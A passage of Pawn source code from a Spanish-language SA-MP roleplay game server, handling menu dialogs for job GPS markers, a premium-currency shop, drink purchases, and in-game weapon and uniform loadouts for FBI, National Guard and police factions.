			Mensaje(playerid, COLOR_GRIS2, "Contraseña Guardada");
		}
		case DIALOGO_TRANSPORTE_AVIADOR:
		{
			if(!response)return 1;
			new listed = listitem + 1;
			cuenta[playerid][selecciono] = listed;
			SetPlayerCheckpoint(playerid, trabAviador[listed][aviPos][0], trabAviador[listed][aviPos][1], trabAviador[listed][aviPos][2], 4.0);
			format(string, sizeof(string), "La posicion a ~g~%s ~w~fue marcada en su GPS.", trabAviador[listed][aviLugar]);
			TextoInformatico(10, playerid, string);
			return 1;
		}
		case DIALOGO_TRANSPORTE_CAMIONERO:
		{
			if(!response)return 1;
			new listed = listitem + 1;
			cuenta[playerid][selecciono] = listed;
			cuenta[playerid][selecciono2] = 2;
			SetPlayerCheckpoint(playerid, trabCamionero[0][camPos][0], trabCamionero[0][camPos][1], trabCamionero[0][camPos][2], 4.0);
			TextoInformatico(10, playerid, "La posicion fue marcada en su GPS.");
			return 1;
		}
		case DIALOGO_SANTIAGO:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
   					{
						if(cuenta[playerid][cZonaZeroCash] < 10)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 10;
						SetHP(playerid, 50);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
					case 1:
					{
						if(cuenta[playerid][cZonaZeroCash] < 15)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 15;
						SetHP(playerid, 80);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
					case 2:
					{
						if(cuenta[playerid][cZonaZeroCash] < 30)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 30;
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
					case 3:
					{
						if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_ROJO, "No esta arriba de un vehiculo!");
						if(cuenta[playerid][cZonaZeroCash] < 65)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 65;
						SetVehicleHealth(GetPlayerVehicleID(playerid), 1000.0);
						autos[idcar][cBattery] = 10000;
						Gas[idcar] = 1000;
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
					case 4:
					{
						if(cuenta[playerid][cZonaZeroCash] < 70)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 70;
						darArma(playerid, 25, 30);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
					case 5:
					{
						if(cuenta[playerid][cZonaZeroCash] < 50)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 50;
						darArma(playerid, 24, 40);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
	                case 6:
					{
						if(cuenta[playerid][cZonaZeroCash] < 125)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 125;
						darArma(playerid, 30, 60);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
	                case 7:
					{
						if(cuenta[playerid][cZonaZeroCash] < 145)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 145;
						darArma(playerid, 31, 60);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
	                case 8:
					{
						if(cuenta[playerid][cZonaZeroCash] < 105)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 105;
						darArma(playerid, 29, 90);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
	                case 9:
					{
						if(cuenta[playerid][cZonaZeroCash] < 350)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 350;
						darArma(playerid, 34, 5);
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria!");
					}
					case 10:
					{
						if(cuenta[playerid][cZonaZeroCash] < 1500)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						cuenta[playerid][cZonaZeroCash] -= 1500;
						cuenta[playerid][cBusqueda] = 0;
						Mensaje(playerid, COLOR_VERDE, "Nivel de Busqueda LIMPIO!");
					}
					case 11:
					{
						new vehicle, tiempo, tiempo2;
						vehicle = cuenta[playerid][cCoche];
						if(!vehicle)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un vehiculo en este slot.");
						if(cuenta[playerid][cZonaZeroCash] < 5000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = autos[vehicle][cVehTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu vehiculo le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 5000;
						autos[vehicle][cVehTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de vehiculo pagado por 2 meses!");
					}
					case 12:
					{
						new vehicle, tiempo, tiempo2;
						vehicle = cuenta[playerid][cCoche2];
						if(!vehicle)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un vehiculo en este slot.");
						if(cuenta[playerid][cZonaZeroCash] < 5000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = autos[vehicle][cVehTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu vehiculo le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 5000;
						autos[vehicle][cVehTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de vehiculo pagado por 2 meses!");
					}
					case 13:
					{
						new vehicle, tiempo, tiempo2;
						vehicle = cuenta[playerid][cCoche3];
						if(!vehicle)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un vehiculo en este slot.");
						if(cuenta[playerid][cZonaZeroCash] < 5000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = autos[vehicle][cVehTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu vehiculo le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 5000;
						autos[vehicle][cVehTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de vehiculo pagado por 2 meses!");
					}
					case 14:
					{
						new vehicle, tiempo, tiempo2;
						vehicle = cuenta[playerid][cCoche4];
						if(!vehicle)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un vehiculo en este slot.");
						if(cuenta[playerid][cZonaZeroCash] < 5000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = autos[vehicle][cVehTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu vehiculo le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 5000;
						autos[vehicle][cVehTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de vehiculo pagado por 2 meses!");
					}
					case 15:
					{
						new casaid, tiempo, tiempo2;
						casaid = cuenta[playerid][cCasa];
						if(casaid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee una casa.");
						if(cuenta[playerid][cZonaZeroCash] < 7000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = casa[casaid][hTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu casa le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 7000;
						casa[casaid][hTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de casa pagado por 2 meses!");
					}
					case 16:
					{
						new casaid, tiempo, tiempo2;
						casaid = cuenta[playerid][cCasa2];
						if(casaid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee una casa.");
						if(cuenta[playerid][cZonaZeroCash] < 7000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = casa[casaid][hTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu casa le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 7000;
						casa[casaid][hTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de casa pagado por 2 meses!");
					}
					case 17:
					{
						new negid, tiempo, tiempo2;
						negid = cuenta[playerid][cNegocio];
						if(negid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un negocio.");
						if(cuenta[playerid][cZonaZeroCash] < 8000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = negocio[negid][bTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu negocio le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 8000;
						negocio[negid][bTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de negocio pagado por 2 meses!");
					}
					case 18:
					{
						new negid, tiempo, tiempo2;
						negid = cuenta[playerid][cNegocio2];
						if(negid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un negocio.");
						if(cuenta[playerid][cZonaZeroCash] < 8000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH!");
						tiempo = negocio[negid][bTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						if(tiempo2 > 60)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu negocio le queden de 1 a 30 dias");
						cuenta[playerid][cZonaZeroCash] -= 8000;
						negocio[negid][bTime] = gettime() + 6160000;
						Mensaje(playerid, COLOR_VERDE, "Impuesto de negocio pagado por 2 meses!");
					}
				}
			}
			return 1;
		}
		case DIALOGO_BENEFICIOS_PREMIUM:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						if(cuenta[playerid][cZonaZeroCash] < 1000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH.");
						cuenta[playerid][cZonaZeroCash] -= 1000;
						cuenta[playerid][cDonar][1] = 1;
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria.");
						Mensaje(playerid, COLOR_BLANCO, "Utiliza /cambiarnombre, CUIDADO sigue las reglas.");
					}
					case 1:
					{
						if(cuenta[playerid][cZonaZeroCash] < 4500)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH.");
						cuenta[playerid][cZonaZeroCash] -= 4500;
						cuenta[playerid][cNivel] += 1;
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria.");
					}
					case 2:
					{
						if(cuenta[playerid][cZonaZeroCash] < 1000)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH.");
						cuenta[playerid][cZonaZeroCash] -= 1000;
						cuenta[playerid][cDinero] += 20000;
						Mensaje(playerid, COLOR_VERDE, "Compra Satisfactoria.");
					}
				}
			}
			return 1;
		}
		case DIALOGO_MENU_BEBIDAS:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
				if(obtenerDinero(playerid) < Bebidas[listitem][b@costo])return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene suficiente dinero.");
				pierdeDinero(playerid, Bebidas[listitem][b@costo]);
				entero[playerid][sbebidas] = 1 + listitem;
				entero[playerid][borracho] = Bebidas[listitem][b@litros];
				SetPlayerAttachedObject(playerid, 5, Bebidas[listitem][b@obj], 6, Bebidas[listitem][b@Pos][0], Bebidas[listitem][b@Pos][1], Bebidas[listitem][b@Pos][2], Bebidas[listitem][b@Pos][3], Bebidas[listitem][b@Pos][4], Bebidas[listitem][b@Pos][5], Bebidas[listitem][b@Pos][6], Bebidas[listitem][b@Pos][7], Bebidas[listitem][b@Pos][8]);

				format(string, sizeof(string), "saca dinero de su billetera y compra %s", Bebidas[listitem][b@Nombre]);
				AccionMe(playerid, string);
				Mensaje(playerid, COLOR_GRIS3, "Gracias por su compra! (Utilice /beber)");
				return 1;
			}
		}
		case EQUIPO_FBI:{
		    if(response){
		        quitarArmas(playerid);
	    	    switch (listitem){
	        	    case 0:{
								darArma(playerid, 3, 1);
								darArma(playerid, 24, 100);
								darArma(playerid, 41, 1000);
                                if(cuenta[playerid][cSexo] == 1){ SetPlayerSkin(playerid, 286); }
								if(cuenta[playerid][cSexo] == 2){ SetPlayerSkin(playerid, 12); }
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se pone el uniforme de FBI.", PlayerName(playerid));
								ProxDetector(2.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 1:{
				                darArma(playerid, 3, 1);
								darArma(playerid, 17, 4);
								darArma(playerid, 29, 200);
								darArma(playerid, 41, 1250);
								darArma(playerid, 25, 100);
								darArma(playerid, 31, 400);
								if(cuenta[playerid][cSexo] == 1){ SetPlayerSkin(playerid, 286); }
								if(cuenta[playerid][cSexo] == 2){ SetPlayerSkin(playerid, 12); }
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se pone el uniforme de FBI.", PlayerName(playerid));
									ProxDetector(2.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 2:{
				                if(cuenta[playerid][cRango] < 4)return Mensaje(playerid, COLOR_GRIS2, "No puedes utilizar esta opción!");
				                darArma(playerid, 43, 50);
				                darArma(playerid, 24, 100);
								if(cuenta[playerid][cSexo] == 1){ SetPlayerSkin(playerid, 286); }
								if(cuenta[playerid][cSexo] == 2){ SetPlayerSkin(playerid, 12); }
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se pone su uniforme de Criminalista.", PlayerName(playerid));
								ProxDetector(2.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 3:{
								if(cuenta[playerid][cSexo] == 1){ SetPlayerSkin(playerid, 137); }
								if(cuenta[playerid][cSexo] == 2){ SetPlayerSkin(playerid, 152); }
								cuenta[playerid][cMascara] = 1;
								darArma(playerid, 24, 100);
								darArma(playerid, 43, 50);
								Mensaje(playerid, -1, "Estas encubierto y tienes una máscara. [/mascara]");
					}
					case 4:{
								if(cuenta[playerid][cSexo] == 1){ SetPlayerSkin(playerid, 135); }
								if(cuenta[playerid][cSexo] == 2){ SetPlayerSkin(playerid, 151); }
								cuenta[playerid][cMascara] = 1;
								darArma(playerid, 24, 100);
								darArma(playerid, 43, 50);
								Mensaje(playerid, -1, "Estas encubierto y tienes una máscara. [/mascara]");
					}
					case 5:
					{
								if(cuenta[playerid][cSexo] == 1){ SetPlayerSkin(playerid, 98); }
								if(cuenta[playerid][cSexo] == 2){ SetPlayerSkin(playerid, 172); }
								cuenta[playerid][cMascara] = 1;
								darArma(playerid, 24, 100);
								darArma(playerid, 43, 50);
								Mensaje(playerid, -1, "Estas encubierto y tienes una máscara. [/mascara]");
					}
					case 6:
					{
								darArmadura(playerid, 200);
								SetHP(playerid, 100);
					}
					case 7:{
				                SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
								format(string, sizeof(string), "* %s se viste con su ropa normal.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
		}
		case EQUIPO_NG:{
		    if(response){
		        quitarArmas(playerid);
	    	    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	        	switch (listitem){
	            	case 0:{
				                darArma(playerid, 4, 1);
								darArma(playerid, 31, 3250);
								SetPlayerSkin(playerid, 179);
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se viste con uniforme de entrenamiento.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
	            	case 1:{
								darArma(playerid, 4, 1);
								darArma(playerid, 46, 1);
								darArma(playerid, 24, 150);
								darArma(playerid, 31, 600);
								darArma(playerid, 29, 500);
								SetPlayerSkin(playerid, 287);
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se viste con uniforme de Soldado.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
		            case 2:{
								darArma(playerid, 4, 1);
								darArma(playerid, 24, 150);
								darArma(playerid, 34, 100);
								SetPlayerSkin(playerid, 287);
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se equipa con armas de Francotirador.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
	        	    case 3:{
								darArma(playerid, 4, 1);
								darArma(playerid, 24, 150);
								darArma(playerid, 29, 500);
								SetPlayerSkin(playerid, 287);
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se viste y equipa con US Army Liviana.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
	            	case 4:{
								darArma(playerid, 4, 1);
								darArma(playerid, 24, 150);
								darArma(playerid, 29, 500);
								darArma(playerid, 27, 100);
								darArma(playerid, 31, 600);
								SetPlayerSkin(playerid, 287);
								SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s se viste y equipa con US Army Pesada.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
		            case 5:{
								SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
								format(string, sizeof(string), "* %s se viste con su ropa normal.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
	        	    case 6:{
				                SetHP(playerid, 100);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* %s coje un chaleco antibalas.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
		}
		case DIALOGO_EQUIPO_LSPD:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
				quitarArmas(playerid);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				switch(listitem)
				{
					case 0:
					{
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_BLANCO, "{868FD9}»{FFFFFF} No estás en servicio.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 41, 500);//Aerosol
						SetPlayerSkin(playerid, 71);
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						format(string, sizeof(string), "* %s se viste con uniforme de Cadete.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 1:
					{
						if(cuenta[playerid][cRango] < 1)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No estás en servicio.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 25, 150);//Escopeta
						darArma(playerid, 41, 1250);
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 280);
						if(cuenta[playerid][cMiembro] == 1 || cuenta[playerid][cLider] == 1){ SetPlayerSkin(playerid, 280); }
						if(cuenta[playerid][cMiembro] == 2 || cuenta[playerid][cLider] == 2){ SetPlayerSkin(playerid, 282); }
						format(string, sizeof(string), "* %s se viste con uniforme de Oficial.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 2:
					{
						if(cuenta[playerid][cRango] < 2)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No estás en servicio.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 25, 150);//Escopeta
						darArmadura(playerid, 100);
						SetHP(playerid, 100);
						SetPlayerSkin(playerid, 282);
						format(string, sizeof(string), "* %s se viste con equipo de Agente.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 3:
					{
						if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No estás en servicio.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 25, 150);//Escopeta
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 265);
						format(string, sizeof(string), "* %s se viste con uniforme de Sargento.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 4:
					{
						if(cuenta[playerid][cRango] < 4)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No estás en servicio.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 25, 150);//Escopeta
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 281);
						format(string, sizeof(string), "* %s se viste con uniforme de Capitán.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 5:
					{
						if(cuenta[playerid][cRango] < 6)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 25, 150);//Escopeta
						darArma(playerid, 29, 300);//MP5
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 31, 400);//M4
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						if(cuenta[playerid][cMiembro] == 1 || cuenta[playerid][cLider] == 1){ SetPlayerSkin(playerid, 283); }
						format(string, sizeof(string), "* %s se viste con el traje de Comandante.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 6:
					{
						if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						darArma(playerid, 17, 5);//Granada de Humo
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 27, 100);//Spaz
						darArma(playerid, 31, 400);//M4
						darArma(playerid, 34, 60);//Sniper
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 285);
						format(string, sizeof(string), "* %s se viste con el equipo SWAT.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 7:
					{
						if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						darArma(playerid, 3, 1);
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 43, 100);//Camara de Fotos
						SetHP(playerid, 100);
     					darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 250);
						format(string, sizeof(string), "* %s se viste con el equipo ANON.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 8:
					{
						if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 29, 300);//MP5
						SetHP(playerid, 100);
     					darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 299);
						format(string, sizeof(string), "* %s se viste con el equipo CROSS.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 9:
					{
						if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 284);
						format(string, sizeof(string), "* %s se viste con el equipo EAGLE.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 10:
					{
						if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No perteneces a tal rango de tropa.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 29, 300);//MP5
						darArma(playerid, 41, 500);//Aerosol
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						SetPlayerSkin(playerid, 302);
						format(string, sizeof(string), "* %s se viste con el equipo WALKER.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 11:
					{
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No estás en servicio.");
						if(cuenta[playerid][cRango] < 2)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No tienes el rango suficiente.");
						darArmadura(playerid, 100);
						SetHP(playerid, 100);
						format(string, sizeof(string), "* %s se coloca el chaleco antibalas.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 12:
					{
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No estás en servicio.");
						if(cuenta[playerid][cRango] < 2)return Mensaje(playerid, COLOR_GRIS2, "{868FD9}»{FFFFFF} No tienes el rango suficiente.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						format(string, sizeof(string), "* %s agarra su pistola & porra.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 13:
					{
						if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_BLANCO, "{868FD9}»{FFFFFF} No estás en servicio.");
						darArma(playerid, 3, 1);//Porra
						darArma(playerid, 24, 100);//Eagle
						darArma(playerid, 41, 500);//Aerosol
						SetPlayerSkin(playerid, 306);
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						format(string, sizeof(string), "* %s se viste con uniforme femenino.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 14:
					{
						SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
						darArma(playerid, 24, 175);
						format(string, sizeof(string), "* %s se viste con ropa normal.", PlayerName(playerid));
